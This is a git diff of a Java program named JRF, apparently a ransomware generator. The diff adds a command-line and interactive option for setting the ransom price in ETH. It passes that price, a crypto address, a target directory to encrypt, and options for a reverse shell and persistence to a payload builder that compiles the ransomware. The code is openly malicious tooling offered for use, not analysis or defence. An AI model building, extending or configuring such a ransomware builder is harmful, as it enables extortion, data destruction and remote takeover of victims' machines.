@@ -32,6 +32,13 @@ public class JRF {
                 .desc("Crypto Address").build();
         options.addOption(AddrOption);
 
+        Option CostOption = Option.builder("c").longOpt("Cost")
+                .argName("Cost in ETH")
+                .hasArg()
+                .required(false)
+                .desc("Cost of decryption in ETH. The default is 1 ETH.").build();
+        options.addOption(CostOption);
+
         Option rev = new Option("r", "UseRev", false, "Activate reverse shell");
         options.addOption(rev);
 
@@ -46,7 +53,7 @@ public class JRF {
                 .argName("Export path")
                 .hasArg()
                 .required(false)
-                .desc("destination for export").build();
+                .desc("Destination for export").build();
         options.addOption(expOption);
 
         Option tgtOption = Option.builder("t").longOpt("TargetDir")
@@ -76,6 +83,7 @@ public class JRF {
             String tgtPath = "";
             String expPath = "";
             String CryptAddress = "[My Address]";
+            double cost = 1;
             boolean useRevShell = false;
             boolean usePersistence = false;
 
@@ -94,6 +102,10 @@ public class JRF {
                 CryptAddress = cmd.getOptionValue("Address");
                 tgtPath = cmd.getOptionValue("TargetDir");
                 expPath = cmd.getOptionValue("Export");
+
+                if (cmd.getOptionValue("Cost") != null) {
+                    cost = Double.parseDouble(cmd.getOptionValue("Cost"));
+                }
 
                 if (tgtPath != null) {
                     for (int i = 0; i < tgtPath.length(); i++) {
@@ -131,7 +143,7 @@ public class JRF {
                     }
                 }
                 
-                PayloadBuilder builder = new PayloadBuilder(tgtPath, CryptAddress, useRevShell, usePersistence, host, revPort);
+                PayloadBuilder builder = new PayloadBuilder(tgtPath, CryptAddress, cost, useRevShell, usePersistence, host, revPort);
                 builder.build();
                 builder.compile();
                 try {
@@ -169,10 +181,16 @@ public class JRF {
             if (action.equals("1")) {
                 System.out.print("Insert your crypto address: ");
                 String CryptAddress = input.nextLine();
+
+                System.out.print("How much ETH do you want it to cost?: ");
+                double cost = Double.parseDouble(input.nextLine());
+
                 System.out.print("Insert target path for encryption: ");
                 String path = input.nextLine();
+
                 System.out.print("Insert local ip address: ");
                 String IP = input.nextLine();
+                
                 System.out.print("Would you like to use a reverse shell? (y/n): ");
                 boolean useRevShell = (input.nextLine().toLowerCase().equals("y"));
                 // input.nextLine();
@@ -186,7 +204,7 @@ public class JRF {
                     usePersistence = (input.nextLine().toLowerCase().equals("y"));
                 }
 
-                PayloadBuilder builder = new PayloadBuilder(path, CryptAddress, useRevShell, usePersistence, IP, port);
+                PayloadBuilder builder = new PayloadBuilder(path, CryptAddress, cost, useRevShell, usePersistence, IP, port);
                 builder.build();
                 builder.compile();
                 System.out.println("Ransomware generated!");
